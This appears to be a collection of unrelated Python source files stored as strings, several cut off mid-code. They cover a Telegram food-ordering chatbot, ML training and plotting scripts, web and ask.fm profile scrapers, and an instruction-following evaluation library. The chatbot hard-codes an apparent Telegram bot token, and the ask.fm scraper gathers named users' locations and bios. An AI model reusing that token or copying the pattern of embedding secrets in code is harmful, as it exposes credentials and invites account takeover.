    "import random\nimport json\nimport pickle\n\nimport numpy as np\nimport telebot\nimport os\n\nos.environ['TF_CPP_MIN_LOG_LEVEL'] = '2'\n\nimport nltk\nfrom nltk.stem import WordNetLemmatizer\n\nfrom tensorflow.keras.models import load_model\n\nlemmatizer = WordNetLemmatizer()\nintents = json.loads(open('training\\intents.json').read())\nmenu = json.loads(open('training\\menu.json').read())\n\nwords = pickle.load(open('training\\words.pkl', 'rb'))\nlabels = pickle.load(open('training\\labels.pkl', 'rb'))\nmodel = load_model('training\\chatbot_model.h5')\n\n\nisOrder = False\ntotal_price = 0.00\n\ndef clean_up_sentence(sentence):\n    sentence_words = nltk.word_tokenize(sentence)\n    sentence_words = [lemmatizer.lemmatize(word) for word in sentence_words]\n    return sentence_words\n\n\ndef bagofwords(sentence):\n    sentence_words = clean_up_sentence(sentence)\n    bag = [0] * len(words)\n    for w in sentence_words:\n        for i, word in enumerate(words):\n            if word == w:\n                bag[i] = 1\n    return np.array(bag)\n\n\n# predict the class based on the sentence\ndef predict_class(sentence):\n    bow = bagofwords(sentence)\n    res = model.predict(np.array([bow]))[0]\n\n    # allows some uncertainty (error detection)\n    ERROR_THRESHOLD = 0.1\n    results = [[i, r] for i, r in enumerate(res) if r > ERROR_THRESHOLD]\n\n    # sort the results\n    results.sort(key=lambda x: x[1], reverse=True)\n    return_list = []\n    for r in results:\n        return_list.append({'intent': labels[r[0]], 'probability': str(r[1])})\n    return return_list\n\n\ndef get_response(intents_list, intents_json):\n    tag = intents_list[0]['intent']\n\n    list_of_intents = intents_json['intents']\n    for i in list_of_intents:\n\n        if i['tag'] == tag:\n            result = random.choice(i['responses'])\n\n            break\n    return result\n\n\ndef order_food(menu_json, id):\n    for x in menu_json:\n\n        if x[\"food_id\"] == id:\n            print(\"Food ID:\", \"\".join(x[\"food_id\"]))\n            print(\"Item name:\", \"\".join(x[\"item_name\"]))\n            print(\"Price:\", \"\".join(x[\"price\"]))\n            return float(x[\"price\"])\n\n\ndef print_stall_menu(menu_json, stall, delivery):\n    for x in menu_json:\n\n        # prints menu for delivery and for the stall\n        if delivery:\n            if x[\"stall_name\"] == stall and x[\"delivery_service\"] == 'yes':\n\n                print(\"Food ID:\", \"\".join(x[\"food_id\"]))\n                print(\"Stall name:\", \"\".join(x[\"stall_name\"]))\n                print(\"Item name:\", \"\".join(x[\"item_name\"]))\n                print(\"Price:\", \"\".join(x[\"price\"]))\n                print(\"Delivery Service:\", \"\".join(x[\"delivery_service\"]))\n                print(\"\\n\")\n\n        # prints menu for stall only\n        else:\n            if x[\"stall_name\"] == stall:\n                print(\"Food ID:\", \"\".join(x[\"food_id\"]))\n                print(\"Stall name:\", \"\".join(x[\"stall_name\"]))\n                print(\"Item name:\", \"\".join(x[\"item_name\"]))\n                print(\"Price:\", \"\".join(x[\"price\"]))\n                print(\"Delivery Service:\", \"\".join(x[\"delivery_service\"]))\n                print(\"\\n\")\n\n\ndef add_order(menu_json, order_id, cart):\n    input_dict = json.loads(menu_json)\n    output_dict = [x for x in input_dict if x['food_id'] == order_id]\n    res = json.dumps(output_dict)\n\n    cart.append(res)\n\n    return cart\n\n\n# API_KEY = os.getenv('API_KEY')\nbot = telebot.TeleBot('6834543597:AAHfo58IPxZq-cY7dvJEc_QUaTU_M1QknfE')\n\n\n@bot.message_handler(commands=['start'])\ndef start(message):\n    bot.send_message(message.chat.id, \"Hi! How can I help you? Would recommend you to start viewing the menu first.\")\n\n# @bot.message_handler(commands=['order'])\n# def start(message):\n#     bot.send_message(message.chat.id, \"Hi! How can I help you? Would recommend you to start viewing the menu first.\")\n#\n#\n#\n#     while temp:\n#         bot.send_message(message.chat.id, 'Type the food id of the food that u want:')\n#         food_id = input()\n#         price = order_food(menu, food_id)\n#         total_price += price  # Total price calculation here\n#\n#         print('Would you like to order anymore food? (1 = no)')\n#         flag = input()\n#\n#         if flag == '1':\n#             temp = False\n#\n#     print('Thanks for your order!')\n#     print('The total price is ')\n#     print(total_price)\n\n\n# shopping_cart_price = 0.00\n\n\n@bot.message_handler(func=lambda m: True)\ndef ordering_process(message):\n    delivery_service = False\n    global isOrder\n    global total_price\n\n    msg = message\n    msg2 = message.text\n\n    if isOrder:\n        food_id = message.text\n        bot.send_message(msg.chat.id, food_id)\n        if food_id.isnumeric():\n\n            price = order_food(menu, food_id)\n\n            total_price += price  # Total price calculation here\n\n            bot.send_message(msg.chat.id, \"Total Price: \" +str(total_price))\n\n        else:\n            bot.send_message(msg.chat.id, \"You did not enter an integer\")\n\n        isOrder=False\n    else:\n        ints = predict_class(msg2)\n        res = get_response",
    "import numpy as np\nimport networkx\nimport matplotlib.pyplot as plt\nfrom sklearn.decomposition import PCA\n\nREVERSE = False\n\nplt.rc('font',**{'family':'sans-serif','sans-serif':['Helvetica Neue LT Std'],'size': 8})\n\n# Generate the graph as an edgelist\nnp.random.seed(1)\nN = 1000\nends = [1]\ntree = [(0,1)]\ncurrent_node = 2\nfor i in range(2,N):\n    from_end = ends.pop(np.random.randint(0, len(ends)))\n    if np.random.rand()>.990:\n        ends.append(current_node)\n        tree.append((from_end,current_node))\n        current_node += 1\n    ends.append(current_node)\n    tree.append((from_end,current_node))\n    current_node += 1\n\n# Use networkx to convert to a graph object and get the positions to draw it\n# nicely.\nG = networkx.from_edgelist(tree)\npos = networkx.kamada_kawai_layout(G)\nposx = np.asarray([pos[i][0] for i in range(0, len(G))])\nposy = np.asarray([pos[i][1] for i in range(0, len(G))])\n# networkx.draw_networkx(G, pos=pos)\n# plt.show()\n\n# Find the shortest path length matrix\nshortest_path_dict = dict(networkx.shortest_paths.shortest_path_length(G))\nshortest_path_matrix = np.asarray([[shortest_path_dict[i][j] for i in range(0, len(G))] for j in range(0, len(G))])\n\n# For the sorting of the covariance matrix, walk the graph and backtrack.\nbranchpoints = []\no = [0]\nnextedge = tree[0]\nfor _ in range(0, len(G)-1):\n    o.append(nextedge[1])\n    nexts = [e for e in tree if e[0] == nextedge[1]]\n    if len(nexts) == 0:\n        if len(branchpoints) == 0:\n            break\n        nextedge = branchpoints.pop()\n    else:\n        nextedge = nexts.pop()\n        branchpoints.extend(nexts)\n\n# Get the covariance matrix and sort it\ncov = np.exp(-shortest_path_matrix/100)[o][:,o]\n\n# Generate timeseries with this covariance matrix\ntss = np.real(np.random.multivariate_normal(np.zeros(len(G)), cov, 50000))\ntss_cv = np.real(np.random.multivariate_normal(np.zeros(len(G)), cov, 50000))\n# sqrtcov = np.real(scipy.linalg.sqrtm(cov))\n# tss = np.random.randn(10000,len(G)) @ sqrtcov\n\npca = PCA(n_components=12)\npca.fit(tss)\n\n# Note this is slightly different than the one used in the rest of the paper\n# since it goes to grey in the middle instead of white\ncmap = plt.cm.colors.LinearSegmentedColormap.from_list('grad', (\n    # Edit this gradient at https://eltos.github.io/gradient/#0:000000-50:FFFFFF-100:266D9C\n    (0.000, (0.000, 0.000, 0.000)),\n    (0.500, (0.800, 0.800, 0.800)),\n    (1.000, (0.149, 0.427, 0.612) if not REVERSE else (.937, .231, .173))))\n\ncmap.set_over((0, 0, 0))\n\nfrom cand import Canvas, Point, Vector\n\nc = Canvas(7.0, 2.1, \"in\")\nc.set_font(\"Nimbus Sans\", size=8, ticksize=7)\nc.add_axis(\"cov\", Point(.2, .5, \"in\"), Point(1.4, 1.7, \"in\"))\nc.add_grid([f\"PC{i}\" for i in range(1, 13)], 2, Point(1.9, .5, \"in\"), Point(5.2, 1.7, \"in\"), spacing=Vector(.1, .1, \"in\"))\nc.add_axis(\"scree\", Point(5.9, .5, \"in\"), Point(6.9, 1.7, \"in\"))\n\nfor i in range(0, 12):\n    ax = c.ax(f\"PC{i+1}\")\n    ax.scatter(posx[o], posy[o], c=pca.components_[i], cmap=cmap, s=3)\n    c.add_text(f\"PC{i+1}\", Point(np.min(posx[o])-.3, np.max(posy[o]), f\"PC{i+1}\"), size=6)\n    ax.axis(\"off\")\n\nc.add_text(\"PC loadings (plotted on the manifold)\", (Point(1, 1, \"axis_PC3\") | Point(0, 1, \"axis_PC4\")) + Vector(0, .2, \"in\"))\n\nax = c.ax(\"cov\")\nax.imshow(cov, cmap=\"PuOr\", vmin=-1, vmax=1)\nax.set_xticks([])\nax.set_yticks([])\nc.add_text(\"Covariance matrix\", Point(.5, 1, \"axis_cov\")+Vector(0, .2, \"in\"))\n\nfrom pcalib import screeplot\n\nax = c.ax(\"scree\")\nscreeplot(tss[0:1000], tss_cv[0:1000], n=12, ax=ax)\nc.add_text(\"Scree plot\", Point(.5, 1, \"axis_scree\")+Vector(0, .2, \"in\"))\n\nc.add_figure_labels([(\"a\", \"cov\"), (\"b\", \"PC1\"), (\"c\", \"scree\")])\n\nc.save(\"figuresup4.pdf\")\n",
    "import os\r\nimport torch\r\nfrom torch import optim, nn\r\nimport numpy as np\r\nimport pandas as pd\r\nfrom tqdm import tqdm\r\nimport math\r\nfrom evaluation import EVAL\r\nfrom utils import save_checkpoint, PSNR\r\n\r\n\r\ndef train(config, net, train_iter, test_iter, device):\r\n    learning_rate = config.lr\r\n    epochs = config.train_iters\r\n\r\n    # lr for prob_conv needs separate setting\r\n    ignored_params = list(map(id, net.prob_convs.parameters()))\r\n    base_params = filter(lambda p: id(p) not in ignored_params, net.parameters())\r\n    optimizer = optim.Adam([\r\n        {'params': base_params},\r\n        {'params': net.prob_convs.parameters(), 'lr': learning_rate/2}], learning_rate)\r\n\r\n    loss_f1 = nn.CrossEntropyLoss()\r\n    loss_f2 = nn.MSELoss()\r\n    results = {'epoch': [], 'acc': [], 'mse': [], 'psnr': [], 'ssim': [], 'loss': []}\r\n    scheduler = torch.optim.lr_scheduler.CosineAnnealingWarmRestarts(optimizer, T_0=config.train_iters+1, T_mult=1, eta_min=1e-6, last_epoch=-1)\r\n\r\n    best_acc = 0\r\n    for epoch in range(epochs):\r\n        net.train()\r\n        epoch_loss = []\r\n        acc_total_train = 0\r\n        psnr_total_train = 0\r\n        for i, (X, Y) in enumerate(tqdm(train_iter)):\r\n            X, Y = X.to(device), Y.to(device)\r\n\r\n            optimizer.zero_grad()\r\n            code, _, _, y_class, y_recon = net(X)\r\n\r\n            loss_1 = loss_f1(y_class, Y)\r\n            loss_2 = loss_f2(y_recon, X)\r\n\r\n            loss = loss_1 + config.tradeoff_lambda * loss_2\r\n\r\n            loss.backward()\r\n            optimizer.step()\r\n            epoch_loss.append(loss.cpu().item())\r\n\r\n            # acc & psnr of the train set\r\n            acc = (y_class.data.max(1)[1] == Y.data).float().sum()\r\n            acc_total_train += acc\r\n            psnr = PSNR(X, y_recon.detach())\r\n            psnr_total_train += psnr\r\n\r\n        scheduler.step()\r\n\r\n        loss = sum(epoch_loss) / len(epoch_loss)\r\n        acc_train = acc_total_train / 50000\r\n        psnr_train = psnr_total_train / 50000\r\n\r\n        acc, mse, psnr, ssim = EVAL(net, test_iter, device, config, epoch)\r\n        print('epoch: {:d}, loss: {:.6f}, acc: {:.3f}, mse: {:.6f}, psnr: {:.3f}, ssim: {:.3f}, lr: {:.6f}'.format\r\n              (epoch, loss, acc, mse, psnr, ssim, optimizer.state_dict()['param_groups'][0]['lr']))\r\n        print('train acc: {:.3f}'.format(acc_train))\r\n        print('train psnr: {:.3f}'.format(psnr_train))\r\n\r\n        acc_num = acc.detach().cpu().numpy()\r\n        results['epoch'].append(epoch)\r\n        results['loss'].append(loss)\r\n        results['acc'].append(acc_num)\r\n        results['mse'].append(mse)\r\n        results['psnr'].append(psnr)\r\n        results['ssim'].append(ssim)\r\n\r\n        if (epochs - epoch) <= 10 and acc_num > best_acc:\r\n            file_name = config.model_path + '/{}/'.format(config.mod_method)\r\n            if not os.path.exists(file_name):\r\n                os.makedirs(file_name)\r\n            model_name = 'CIFAR_SNR{:.3f}_Trans{:d}_{}.pth.tar'.format(\r\n                config.snr_train, config.channel_use, config.mod_method)\r\n            save_checkpoint(net.state_dict(), file_name + model_name)\r\n            best_acc = acc_num\r\n\r\n    # in the end save all the results\r\n    data = pd.DataFrame(results)\r\n    file_name = config.result_path + '/{}/'.format(config.mod_method)\r\n    if not os.path.exists(file_name):\r\n        os.makedirs(file_name)\r\n\r\n    result_name = 'CIFAR_SNR{:.3f}_Trans{:d}_{}.csv'.format(\r\n            config.snr_train, config.channel_use, config.mod_method)\r\n    data.to_csv(file_name + result_name, index=False, header=False)\r\n\r\n\r\n",
    "import os\nimport filecmp\nimport shutil\nfrom .face_swap import MultisubjectFaceSwapNode\nfrom .regional_prompting import RegionalPromptingNode, RegionalAttentionProcessorNode, GetRegionalMaskNode\n\nimport __main__\n\n\n# Update to javascripts files\njavascript_folder = os.path.join(os.path.dirname(os.path.realpath(__file__)), \"javascript\")\nextentions_folder = os.path.join(os.path.dirname(os.path.realpath(__main__.__file__)), \"web\" + os.sep + \"extensions\" + os.sep + \"SALT\" + os.sep)\nif not os.path.exists(extentions_folder):\n    os.mkdir(extentions_folder)\n\nresult = filecmp.dircmp(javascript_folder, extentions_folder)\nif result.left_only or result.diff_files:\n    file_list = list(result.left_only)\n    file_list.extend(x for x in result.diff_files if x not in file_list)\n\n    for file in file_list:\n        src_file = os.path.join(javascript_folder, file)\n        dst_file = os.path.join(extentions_folder, file)\n        if os.path.exists(dst_file):\n            os.remove(dst_file)\n        shutil.copy(src_file, dst_file)\n\n\nNODE_DISPLAY_NAME_MAPPINGS = {\n    \"MultisubjectFaceSwapNode\": \"Multisubject Face Swap\",\n    \"RegionalPromptingNode\": \"Regional Prompting\",\n    \"RegionalAttentionProcessorNode\": \"Regional Attention Processor\",\n    \"GetRegionalMaskNode\": \"Get Regional Mask Node\",\n}\n\nNODE_CLASS_MAPPINGS = {\n    \"MultisubjectFaceSwapNode\": MultisubjectFaceSwapNode,\n    \"RegionalPromptingNode\": RegionalPromptingNode,\n    \"RegionalAttentionProcessorNode\": RegionalAttentionProcessorNode,\n    \"GetRegionalMaskNode\": GetRegionalMaskNode,\n}\n",
    "from sentence_transformers import SentenceTransformer, util\nfrom dotenv import load_dotenv\nimport os\nimport torch\nimport json\n\nload_dotenv('.env')\n# Load Limit Score constant from env\nlimit_score = float(os.environ['LIMIT_SCORE'])\ninput_cn_file_path = os.environ['OUT_CN_FILE_PATH']\ninput_en_file_path = os.environ['OUT_EN_FILE_PATH']\nresult_file_path = os.environ['RESULT_JSON_FILE_PATH']\n\n# save model in current directory\nmodel = SentenceTransformer('paraphrase-multilingual-MiniLM-L12-v2', device='cpu', cache_folder='./')\n# save model in models folder (you need to create the folder on your own beforehand)\n# model = SentenceTransformer('paraphrase-multilingual-MiniLM-L12-v2', device='cpu', cache_folder='./models/')\nprint(\"Read Input Files ...\")\n# Read queries from file and split by line breaks\nwith open(input_en_file_path, \"r\", encoding='utf-8') as query_file:\n    queries = query_file.read().split(\"\\n\\n\")\n\n# Read corpus from file and split by line breaks\nwith open(input_cn_file_path, \"r\", encoding='utf-8') as corpus_file:\n    corpus = corpus_file.read().split(\"\\n\\n\")\n\ndef similarity_score(query, document):\n    # Calculate cosine similarity between query and document\n    query_embedding = model.encode(query, convert_to_tensor=True)\n    document_embedding = model.encode(document, convert_to_tensor=True)\n    cosine_similarity = util.pytorch_cos_sim(query_embedding, document_embedding)\n    return cosine_similarity\n\ndef top_similarity_score(query, document_list):\n        # Calculate cosine similarity between query and document\n    query_embedding = model.encode(query, convert_to_tensor=True)\n    cosine_similarity_list = []\n    for document in document_list:\n        document_embedding = model.encode(document, convert_to_tensor=True)\n        cosine_similarity = util.pytorch_cos_sim(query_embedding, document_embedding)\n        cosine_similarity_list.append(cosine_similarity)\n    # Max similarity score \n    max_similarity_score = max(cosine_similarity_list)\n    # Get top 1 similarity score document\n    top_similarity_document = document_list[cosine_similarity_list.index(max_similarity_score)]\n    result = {\n            \"query\": query,\n            \"document\": top_similarity_document,\n            \"score\": max_similarity_score\n        }\n    return result\n\ndef similarity_score_list(query_list, document_list):\n    # Batch queries and documents for similarity score calculation\n    query_embedding_list = model.encode(query_list, convert_to_tensor=True)\n    document_embedding_list = model.encode(document_list, convert_to_tensor=True)\n    cosine_similarity_list = util.pytorch_cos_sim(query_embedding_list, document_embedding_list)\n    return cosine_similarity_list\n\ndef get_limit_score(cosine_similarity_list):\n    # Get limit score for each query\n    limit_score_list = []\n    for cosine_similarity in cosine_similarity_list:\n        if cosine_similarity > limit_score:\n            limit_score_list.append(1)\n        else:\n            limit_score_list.append(0)\n    return limit_score_list\ndef get_matching_documents(queries, document_list):\n    # Get Matching documents section by high probability\n    matching_list = []\n    results = []\n    query_count = len(queries)\n    print(query_count)\n    document_count = len(document_list)\n    document_pitch = 10\n    for index,query in enumerate(queries):\n        # Select documents section by high probability\n        if index / query_count * document_count - document_pitch < 0 :\n            low_limit = 0  \n            high_limit = int(index / query_count * document_count + document_pitch)\n        elif index / query_count * document_count - document_pitch > document_count :\n            low_limit = int(index / query_count * document_count - document_pitch)\n            high_limit = document_count  \n        else :\n            low_limit =  int(index / query_count * document_count - document_pitch)\n            high_limit = int(index / query_count * document_count + document_pitch)\n        print(low_limit, high_limit)\n        calc_document_list = document_list[low_limit:high_limit]\n        \n        result = top_similarity_score(query, calc_document_list)\n \n        matching_list.append(result)\n    return matching_list\nwith open(result_file_path, 'w', encoding=\"utf-8\") as file:\n    json.dump(get_matching_documents(queries,corpus), file, ensure_ascii=False, indent=4)\nprint(\"Done!\")",
    "import requests\nfrom urllib.parse import urlparse, urljoin\nfrom bs4 import BeautifulSoup\n\ndef get_links(url):\n    \"\"\"\n    Retrieve all the links from a given URL.\n\n    Args:\n    url (str): The URL to scrape.\n\n    Returns:\n    list: A list of links found on the webpage.\n    \"\"\"\n    try:\n        headers = {\n            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'\n            }\n        response = requests.get(url, headers=headers)\n        if response.status_code == 200:\n            soup = BeautifulSoup(response.text, 'html.parser')\n            links = [link.get('href') for link in soup.find_all('a', href=True)]\n            return links\n        else:\n            return []\n    except Exception as e:\n        return []\n\ndef filter_links(links, main_domain):\n    \"\"\"\n    Filter out links that do not belong to the main domain and exclude media files.\n\n    Args:\n    links (list): A list of links to be filtered.\n    main_domain (str): The main domain of the website.\n\n    Returns:\n    list: A list of filtered links.\n    \"\"\"\n    valid_links = []\n    for link in links:\n        if link is None:\n            continue\n        parsed_url = urlparse(link)\n        if parsed_url.scheme not in ('http', 'https'):\n            continue\n        if parsed_url.netloc != main_domain:\n            continue\n        if parsed_url.path.lower().endswith(('.jpg', '.png', '.gif', '.mp4', '.avi', '.mp3')):\n            continue\n        valid_links.append(link)\n    return valid_links\n\ndef scrape_website(url, depth, main_domain, visited=None):\n    \"\"\"\n    Scrape the website for links up to a specified depth.\n\n    Args:\n    url (str): The URL of the website to scrape.\n    depth (int): The depth to scrape links.\n    main_domain (str): The main domain of the website.\n    visited (set, optional): A set to store visited URLs to avoid duplicates.\n\n    Returns:\n    list: A list of links found on the website up to the specified depth.\n    \"\"\"\n    if visited is None:\n        visited = set()\n\n    if depth == 0:\n        return [url]\n\n    if url in visited:\n        return []\n\n    visited.add(url)\n\n    links = get_links(url)\n    filtered_links = filter_links(links, main_domain)\n\n    collected_links = [url]\n    if depth > 1:\n        for link in filtered_links:\n            absolute_url = urljoin(url, link)\n            collected_links.extend(scrape_website(absolute_url, depth - 1, main_domain, visited))\n\n    return collected_links\n\ndef scrape_urls(website, depth=2):\n    \"\"\"\n    Scrape URLs from a website up to a specified depth.\n\n    Args:\n    website (str): The URL of the website to scrape.\n    depth (int): The depth to scrape links.\n\n    Returns:\n    list: A list of URLs found on the website up to the specified depth.\n    \"\"\"\n    main_domain = urlparse(website).netloc\n    links = scrape_website(website, depth, main_domain)\n    return links\n",
    "import asyncio\nimport aiohttp\nimport re\nfrom bs4 import BeautifulSoup\n\n\nasync def scrape_user_info(session, username):\n    url = f\"https://ask.fm/{username}\"\n    async with session.get(url) as response:\n        if response.status == 200:\n            content = await response.text()\n            soup = BeautifulSoup(content, 'html.parser')\n\n            # Get Avatar Url\n            avatar_url=\"\"\n            a_element = soup.find('a', class_='userAvatar-big')\n            if a_element:\n                # Get the style attribute value\n                style_attr = a_element.get('style')\n\n                # Extract the image URL from the style attribute\n                start_index = style_attr.find('url(') + 4\n                end_index = style_attr.find(')')\n\n                avatar_url = style_attr[start_index:end_index]\n            else:\n                avatar_url=\"\"\n            # Get Name Element\n            name_element = soup.find('span', class_='ellipsis lh-spacy')\n            location_element = soup.find('div', class_='mv-2 mh-2 md:mh-0 pl-6 position-relative text-gray-200 icon-location')\n            bio_element = soup.find('div', class_='mv-2 mh-2 md:mh-0 pl-6 position-relative text-gray-200 icon-bio')\n            posts_elemtnt = soup.find('div', class_='profileTabAnswerCount text-large')\n            likes_elemtnt = soup.find('div', class_='profileTabLikeCount text-large')\n\n\n\n            full_name = name_element.get_text(strip=True) if name_element else \"\"\n            location = location_element.get_text(strip=True) if location_element else \"\"\n            bio = bio_element.get_text(strip=True) if bio_element else \"\"\n            posts = posts_elemtnt.get_text(strip=True) if posts_elemtnt else \"\"\n            likes = likes_elemtnt.get_text(strip=True) if likes_elemtnt else \"\"\n            # Find the specific 'div' element with the given class\n            return {\n                \"Username\": username,\n                \"Name\": full_name,\n                \"Posts\": posts + \" posts\",\n                \"Likes\": likes + \" likes\",\n                \"User-bio\": bio,\n                \"Avatar-link\": avatar_url,\n                \"Location\": location,\n                \"Link\": url\n            }\n        else:\n            print(f\"Error retrieving data for user: {username}\")\n            return None\n\nasync def scrape_users(usernames):\n    async with aiohttp.ClientSession() as session:\n        tasks = []\n        for username in usernames:\n            task = asyncio.ensure_future(scrape_user_info(session, username))\n            tasks.append(task)\n        results = await asyncio.gather(*tasks)\n        return results\n\n\nif __name__ == '__main__':\n    usernames = [\"mmadeehaa\",\"akira\",\"michael\"]\n    # usernames = [\"bareandneutral\", \"sirbalocomedy_\", \"melekazad\", \"gracino___\", \"anthonumeh\"]\n\n    try:\n        loop = asyncio.get_event_loop()\n        scraped_data = loop.run_until_complete(scrape_users(usernames))\n        for data in scraped_data:\n            if data:\n                for key, value in data.items():\n                    print(f\"{key}: {value}\")\n                print(\"---------------------------\")\n    except RuntimeError as e:\n        if str(e) == \"Event loop is closed\":\n            pass\n        else:\n            raise  # Re-raise other RuntimeError exceptions\n    finally:\n        loop.close()",
    "import torch.nn as nn\r\nfrom transformers import BertModel, BertConfig, BertTokenizerFast\r\nfrom transformers import OpenAIGPTConfig, OpenAIGPTModel\r\nimport torch\r\nimport pandas as pd\r\nfrom sklearn.model_selection import train_test_split\r\nfrom tokenizers import Tokenizer\r\nfrom tokenizers.models import BPE, Unigram, WordLevel, WordPiece\r\nfrom tokenizers.trainers import BpeTrainer, WordLevelTrainer, \\\r\n                                WordPieceTrainer, UnigramTrainer\r\nfrom tokenizers.pre_tokenizers import Sequence, Digits, Whitespace\r\nfrom torch.optim import Adam\r\nimport sys\r\nimport os\r\nimport time\r\nfrom transformers import PreTrainedTokenizerFast\r\nimport pickle\r\nimport subprocess as sp\r\nimport os\r\nimport logging\r\nimport random\r\nfrom sklearn.metrics import matthews_corrcoef, accuracy_score\r\nimport numpy as np\r\nimport argparse\r\nfrom scipy import stats\r\n\r\nlogger=logging.getLogger()\r\nlogger.setLevel(logging.DEBUG)\r\nlogger.addHandler(logging.StreamHandler())\r\n\r\nTRAIN_DF_NAME = \"train.csv\"\r\nVALID_DF_NAME = \"valid.csv\"\r\nTEST_DF_NAME = \"test.csv\"\r\n\r\nTASK_REGRESSION = \"REGRESSION\"\r\nTASK_CLASSIFICATION = \"CLASSIFICATION\"\r\n\r\nTOKEZNIER_BPE = \"BPE\"\r\nTOKEZNIER_WPC = \"WPC\"\r\nTOKEZNIER_UNI = \"UNI\"\r\nTOKEZNIER_WORDS = \"WORDS\"\r\nTOKEZNIER_PAIRS = \"PAIRS\"\r\n\r\nUNK_TOKEN = \"<UNK>\"  # token for unknown words\r\nSPL_TOKENS = [UNK_TOKEN]  # special tokens\r\n\r\n\r\nclass Dataset(torch.utils.data.Dataset):\r\n    def __init__(self, encodings, labels):\r\n        self.encodings = encodings\r\n        self.labels = labels \r\n\r\n    def __getitem__(self, idx):\r\n        return self.encodings[idx], self.labels[idx]\r\n\r\n    def __len__(self):\r\n        return len(self.encodings)\r\n\r\ndef add_arguments(parser):\r\n    parser.add_argument(\"-t\", \"--tokenizer-type\", type=str, choices=[TOKEZNIER_BPE, TOKEZNIER_WPC, TOKEZNIER_UNI, TOKEZNIER_WORDS, TOKEZNIER_PAIRS], default=TOKEZNIER_WORDS, help=f'which tokenizer to train options: [\"{TOKEZNIER_BPE}\", \"{TOKEZNIER_WPC}\", \"{TOKEZNIER_UNI}\", \"{TOKEZNIER_WORDS}\", \"{TOKEZNIER_PAIRS}\"]')\r\n    parser.add_argument(\"-s\", \"--vocab-size\", type=int, default=100, help=f'vocabulary size for the trained tokenziers: \"{TOKEZNIER_BPE}\", \"{TOKEZNIER_WPC}\" and \"{TOKEZNIER_UNI}\"')\r\n    parser.add_argument(\"-r\", \"--results-path\", type=str, default='.', help='path to save model, tokneizer and results csv')\r\n    parser.add_argument(\"-l\", \"--layers-num\", type=int, default=2, help='numbers of BERT layers')\r\n    parser.add_argument(\"-a\", \"--attention-heads-num\", type=int, default=2, help='numbers of BERT attention heads')\r\n    parser.add_argument(\"-z\", \"--hidden-size\", type=int, default=128, help='hidden size')\r\n    parser.add_argument(\"-d\", \"--data-path\", type=str, help='path to folder containing three files: train.csv, valid.csv and test.csv')\r\n    parser.add_argument(\"-e\", \"--epochs\", type=int, default=30, help='number of training epochs')\r\n    parser.add_argument(\"-p\", \"--print-training-loss\", type=int, default=1000, help='number of iteration before printing a log')\r\n    parser.add_argument(\"-y\", \"--task-type\", type=str, choices=[TASK_REGRESSION, TASK_CLASSIFICATION], required=True, help=f'task type: [\"{TASK_REGRESSION}\" or \"{TASK_CLASSIFICATION}\"]')\r\n    parser.add_argument(\"-m\", \"--max-length\", type=int, default=512, help=f'max tokens per seqeunce')\r\n    parser.add_argument(\"-lr\", \"--learning-rate\", type=float, default=0.0001, help=f'learning rate for the model training')\r\n\r\ndef prepare_tokenizer_trainer(alg, voc_size):\r\n    \"\"\"\r\n    Prepares the tokenizer and trainer with unknown & special tokens.\r\n    \"\"\"\r\n    if alg == TOKEZNIER_BPE:\r\n        tokenizer = Tokenizer(BPE(unk_token = UNK_TOKEN))\r\n        trainer = BpeTrainer(special_tokens = SPL_TOKENS, vocab_size=voc_size)\r\n    elif alg == TOKEZNIER_UNI:\r\n        tokenizer = Tokenizer(Unigram())\r\n        trainer = UnigramTrainer(unk_token= UNK_TOKEN, special_tokens = SPL_TOKENS, vocab_size=voc_size)\r\n    elif alg == TOKEZNIER_WPC:\r\n        tokenizer = Tokenizer(WordPiece(unk_token = UNK_TOKEN, max_input_chars_per_word=10000))\r\n        trainer = WordPieceTrainer(special_tokens = SPL_TOKENS, vocab_size=voc_size)\r\n    elif alg == TOKEZNIER_WORDS:\r\n        tokenizer = Tokenizer(WordLevel(unk_token = UNK_TOKEN))\r\n        trainer = WordLevelTrainer(special_tokens = SPL_TOKENS)\r\n    elif alg == TOKEZNIER_PAIRS:\r\n        tokenizer = Tokenizer(WordLevel(unk_token = UNK_TOKEN))\r\n        trainer = WordLevelTrainer(special_tokens = SPL_TOKENS)\r\n    else:\r\n        exit(f'unknown tokenizer type, please use one of the following: [\"{TOKEZNIER_BPE}\", \"{TOKEZNIER_WPC}\", \"{TOKEZNIER_UNI}\", \"{TOKEZNIER_WORDS}\", \"{TOKEZNIER_PAIRS}\"]')\r\n    \r\n    tokenizer.pre_tokenizer = Whitespace()\r\n    return tokenizer, trainer\r\n    \r\ndef train_tokenizer(iterator, alg, vocab_size):\r\n    \"\"\"\r\n    Takes the files and trains the tokenizer.\r\n    \"\"\"\r\n    tokenizer, trainer = prepare_tokenizer_trainer(alg, vocab_size)\r\n    tokenizer.train_from_iterator(iterator, trainer) # training the tokenzier\r\n    return tokenizer\r\n\r\ndef batch_ite",
    "# coding=utf-8\n# Copyright 2024 The Google Research Authors.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"Library of instructions.\"\"\"\nimport collections\nimport json\nimport random\nimport re\nimport string\nfrom typing import Dict, Optional, Sequence, Union\n\nfrom absl import logging\nimport langdetect\nimport kolibrify.eval.ifeval.en.instructions_util as instructions_util\n\n\n_InstructionArgsDtype = Optional[Dict[str, Union[int, str, Sequence[str]]]]\n\n_LANGUAGES = instructions_util.LANGUAGE_CODES\n\n# The relational operation for comparison.\n_COMPARISON_RELATION = (\"less than\", \"at least\")\n\n# The maximum number of sentences.\n_MAX_NUM_SENTENCES = 20\n\n# The number of placeholders.\n_NUM_PLACEHOLDERS = 4\n\n# The number of bullet lists.\n_NUM_BULLETS = 5\n\n# The options of constrained response.\n_CONSTRAINED_RESPONSE_OPTIONS = (\n    \"My answer is yes.\", \"My answer is no.\", \"My answer is maybe.\")\n\n# The options of starter keywords.\n_STARTER_OPTIONS = (\"I would say\", \"My answer is\", \"I believe\",\n                    \"In my opinion\", \"I think\", \"I reckon\", \"I feel\",\n                    \"From my perspective\", \"As I see it\", \"According to me\",\n                    \"As far as I'm concerned\", \"To my understanding\",\n                    \"In my view\", \"My take on it is\", \"As per my perception\")\n\n# The options of 